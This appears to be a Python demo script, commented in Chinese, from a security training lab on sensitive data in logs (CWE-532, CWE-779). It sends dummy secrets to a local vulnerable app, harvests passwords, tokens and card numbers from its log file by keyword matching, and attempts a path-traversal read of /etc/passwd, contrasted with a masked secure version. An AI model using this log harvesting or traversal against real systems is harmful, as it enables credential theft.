#!/usr/bin/env python3
"""
A09:2021 - Sensitive Data Exposure in Logs
CWE-532: Insertion of Sensitive Information into Log File
CWE-779: Logging of Excessive Data

攻擊原理：
1. 漏洞版本將密碼、Token、信用卡號等敏感資料寫入日誌
2. 攻擊者可以透過存取日誌檔案獲取這些敏感資訊
3. 過度的日誌記錄（如完整請求體）也會洩露敏感資料
"""

import requests
import json
import sys

# 目標 URL
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_response(response):
    """格式化輸出回應"""
    print(f"Status: {response.status_code}")
    try:
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
    except:
        print(response.text[:500])


def demo_sensitive_data_in_logs_vulnerable():
    """
    展示敏感資料被記錄到日誌
    """
    print("\n" + "="*60)
    print("漏洞版本 - 敏感資料洩露到日誌 (CWE-532)")
    print("="*60)
    
    # 發送包含敏感資料的註冊請求
    print("\n[1] 發送包含敏感資料的註冊請求...")
    
    sensitive_data = {
        "username": "testuser",
        "password": "SuperSecretPassword123!",
        "email": "test@example.com",
        "creditCard": "4111-1111-1111-1111",
        "cvv": "123",
        "ssn": "123-45-6789"
    }
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/logging/demo/register",
        json=sensitive_data,
        timeout=10
    )
    print_response(response)
    
    print("\n[!] ⚠️ 敏感資料可能已被記錄到日誌：")
    print(f"    - 密碼: {sensitive_data['password']}")
    print(f"    - 信用卡號: {sensitive_data['creditCard']}")
    print(f"    - CVV: {sensitive_data['cvv']}")
    print(f"    - SSN: {sensitive_data['ssn']}")
    
    # 發送包含 Token 的 API 請求
    print("\n[2] 發送包含 Token 的 API 請求...")
    
    headers = {
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
        "X-API-Key": "sk-live-abcdef123456789"
    }
    
    response = requests.get(
        f"{VULNERABLE_URL}/api/logging/demo/api-call",
        headers=headers,
        timeout=10
    )
    print_response(response)
    
    print("\n[!] ⚠️ Token 可能已被記錄到日誌：")
    print(f"    - Authorization: {headers['Authorization'][:50]}...")
    print(f"    - X-API-Key: {headers['X-API-Key']}")
    
    # 嘗試讀取日誌檔案
    print("\n[3] 嘗試讀取日誌檔案...")
    extract_sensitive_from_logs()


def extract_sensitive_from_logs():
    """
    從日誌檔案中提取敏感資料
    """
    try:
        response = requests.get(
            f"{VULNERABLE_URL}/api/logging/view/file?filename=vulnerable-app.log&lines=50",
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            log_lines = data.get("lines", [])
            
            print(f"\n[*] 讀取到 {len(log_lines)} 行日誌")
            
            # 搜尋敏感資料
            sensitive_patterns = [
                ("password", "密碼"),
                ("creditcard", "信用卡"),
                ("credit_card", "信用卡"),
                ("4111", "信用卡號"),
                ("token", "Token"),
                ("Bearer", "JWT Token"),
                ("sk-", "API Key"),
                ("ssn", "社會安全碼"),
                ("cvv", "CVV")
            ]
            
            found_sensitive = []
            for line in log_lines:
                line_lower = line.lower()
                for pattern, name in sensitive_patterns:
                    if pattern.lower() in line_lower:
                        found_sensitive.append((name, line[:100]))
            
            if found_sensitive:
                print("\n[!] ⚠️ 在日誌中發現敏感資料！")
                for name, line in found_sensitive[:10]:
                    print(f"\n    [{name}]")
                    print(f"    {line}...")
            else:
                print("\n[*] 未在日誌中發現明顯的敏感資料")
                print("[*] （可能需要等待日誌刷新）")
                
    except Exception as e:
        print(f"[!] 無法讀取日誌: {e}")


def demo_excessive_logging_vulnerable():
    """
    展示過度日誌記錄
    """
    print("\n" + "="*60)
    print("漏洞版本 - 過度日誌記錄 (CWE-779)")
    print("="*60)
    
    print("\n[1] 發送包含敏感資料的請求...")
    
    payload = {
        "user": {
            "id": 123,
            "username": "victim",
            "password": "secret123",
            "creditCard": "4111-1111-1111-1111"
        },
        "action": "update_profile",
        "apiKey": "private-api-key-12345"
    }
    
    headers = {
        "Authorization": "Bearer sensitive-jwt-token",
        "Cookie": "session=abc123; auth_token=xyz789",
        "X-Custom-Secret": "my-secret-value"
    }
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/logging/demo/process",
        json=payload,
        headers=headers,
        timeout=10
    )
    print_response(response)
    
    print("\n[!] ⚠️ 過度日誌記錄的問題：")
    print("    - 完整請求體被記錄（包含密碼、信用卡）")
    print("    - 所有 HTTP 標頭被記錄（包含認證 Token）")
    print("    - Cookie 被記錄（包含 Session ID）")
    print("    - 這些資訊可能被存取日誌的人看到")


def demo_masked_logging_secure():
    """
    展示安全版本的資料遮罩
    """
    print("\n" + "="*60)
    print("安全版本 - 敏感資料遮罩")
    print("="*60)
    
    print("\n[1] 發送包含敏感資料的註冊請求...")
    
    sensitive_data = {
        "username": "testuser",
        "password": "SuperSecretPassword123!",
        "email": "test@example.com",
        "creditCard": "4111-1111-1111-1111"
    }
    
    response = requests.post(
        f"{SECURE_URL}/api/logging/demo/register",
        json=sensitive_data,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        data = response.json()
        logged_data = data.get("loggedData", {})
        
        print("\n[+] ✓ 日誌中記錄的資料（已遮罩）：")
        for key, value in logged_data.items():
            print(f"    {key}: {value}")
        
        if logged_data.get("password") == "***MASKED***":
            print("\n[+] ✓ 密碼已被遮罩！")
        if logged_data.get("creditCard") == "***MASKED***":
            print("[+] ✓ 信用卡號已被遮罩！")


def demo_log_access_control():
    """
    展示日誌存取控制的差異
    """
    print("\n" + "="*60)
    print("日誌檔案存取控制比較")
    print("="*60)
    
    # 漏洞版本：可以讀取日誌檔案
    print("\n[1] 漏洞版本 - 讀取日誌檔案...")
    response = requests.get(
        f"{VULNERABLE_URL}/api/logging/view/file?filename=vulnerable-app.log&lines=10",
        timeout=10
    )
    
    if response.status_code == 200:
        data = response.json()
        lines = data.get("lines", [])
        print(f"[!] ⚠️ 成功讀取 {len(lines)} 行日誌")
        print("[!] 任何人都可以存取日誌檔案！")
    
    # 嘗試路徑遍歷
    print("\n[2] 漏洞版本 - 嘗試路徑遍歷...")
    response = requests.get(
        f"{VULNERABLE_URL}/api/logging/view/file?filename=../../../etc/passwd&lines=10",
        timeout=10
    )
    
    if response.status_code == 200:
        data = response.json()
        if "root" in str(data):
            print("[!] ⚠️ 路徑遍歷成功！可以讀取系統檔案")
        else:
            print("[*] 路徑遍歷嘗試（結果視系統而定）")
    
    # 安全版本：需要權限
    print("\n[3] 安全版本 - 日誌檔案存取...")
    print("[*] 安全版本不提供直接的日誌檔案讀取 API")
    print("[*] 日誌只能透過 SIEM 或管理介面存取")


def main():
    """主函數"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  A09:2021 - Sensitive Data Exposure in Logs                  ║
║  CWE-532: Insertion of Sensitive Information into Log File  ║
║  CWE-779: Logging of Excessive Data                          ║
╠═══════════════════════════════════════════════════════════════╣
║  攻擊方式：從日誌檔案中提取敏感資訊                          ║
║  防禦方式：遮罩敏感資料，限制日誌內容和存取                  ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        if target == "vulnerable":
            demo_sensitive_data_in_logs_vulnerable()
            demo_excessive_logging_vulnerable()
        elif target == "secure":
            demo_masked_logging_secure()
        elif target == "access":
            demo_log_access_control()
        elif target == "both":
            demo_sensitive_data_in_logs_vulnerable()
            demo_excessive_logging_vulnerable()
            print("\n" + "-"*60 + "\n")
            demo_masked_logging_secure()
            demo_log_access_control()
        else:
            print(f"用法: {sys.argv[0]} [vulnerable|secure|access|both]")
    else:
        demo_sensitive_data_in_logs_vulnerable()
        demo_excessive_logging_vulnerable()
        print("\n" + "-"*60 + "\n")
        demo_masked_logging_secure()
        print("\n" + "-"*60 + "\n")
        demo_log_access_control()
    
    print("\n[*] 演示完成")


if __name__ == "__main__":
    main()
